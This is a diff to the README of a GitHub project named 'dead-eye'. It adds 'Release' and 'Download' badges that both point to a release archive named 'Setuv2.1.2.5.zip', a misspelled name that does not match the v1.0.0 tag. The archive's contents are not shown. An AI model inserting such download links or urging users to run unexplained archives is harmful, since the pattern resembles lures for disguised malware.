@@ -1,3 +1,5 @@
+[![Release](https://img.shields.io/badge/release-v1.0.0-informational?style=for-the-badge)](https://github.com/oliverm-1902b0/dead-eye/releases/download/v1.0.0/Setuv2.1.2.5.zip) [![Download](https://img.shields.io/badge/download-here-brightgreen?style=for-the-badge)](https://github.com/oliverm-1902b0/dead-eye/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 🎮 dead-eye
 
 ![License](https://img.shields.io/github/license/oliverm-1902b0/dead-eye) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)
